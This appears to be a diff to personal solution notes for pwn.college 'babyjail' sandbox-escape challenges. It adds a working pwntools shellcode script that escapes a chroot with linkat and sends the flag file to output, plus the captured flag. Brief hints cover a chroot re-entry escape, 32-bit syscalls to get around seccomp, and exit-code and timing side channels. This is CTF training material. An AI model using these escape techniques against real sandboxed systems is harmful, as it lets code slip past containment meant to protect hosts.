@@ -242,14 +242,81 @@ pwn.college{g08SuMeqWCl0VRIQzrEEVf8yssF.QX0MjMscTOxUzW}
 
 ==========================================================================================
 
-# 5
+# 5 -> using linkat (265)
+# using python pwn
+import pwn
+
+pwn.context.arch = "amd64"
+pwn.context.encoding = "latin"
+
+with pwn.process(["/challenge/babyjail_level5", "/"]) as target:
+    pwn.info(target.readrepeat(1))
+
+
+    target.send(pwn.asm(f"""
+    {pwn.shellcraft.pushstr("flag")}
+    mov rsi, rsp
+    {pwn.shellcraft.linkat(3, "rsi", -100, "abc", 0)}
+
+    {pwn.shellcraft.open("/abc", 0)}
+
+    {pwn.shellcraft.sendfile(1, 4, 0, 1024)}
+    """))
+
+    pwn.info(target.readrepeat(1))
+
+python3 jail5.py
+pwn.college{Mg_bgz4gSfzRuIhY2R0liVUNjEX.QX1MjMscTOxUzW}
+==========================================================================================
+
+# 6
+
+
+==========================================================================================
+
+# 7 -> kernal has no memory of chroot
+# check where chroot is at 
+# chroot again and move "wall"
+# move wall to where you are
+# s file
 
 
 
 
 ==========================================================================================
 
-# 12
+# 8
+
+==========================================================================================
+
+# 9 -> seccomp
+# int 0x80 -> use syscalls for 32 bit mode
+
+
+==========================================================================================
+
+# 10 only read and exit
+# exit s file
+.global _start
+.intel_syntax noprefix
+start:
+        mov rax, 60
+        mov rdi, 42
+        syscall
+# parent can see what exit code the child exited with
+# exit is a side channel
+
+==========================================================================================
+
+# 11
+
+==========================================================================================
+
+# 12 can only read -> side channel of communication
+# try using time /challenge/babyjail_level12 /flag < solve.bin
+# check if bit is a 1 or 0 and do it again and again ... 
+
+
 
 
 
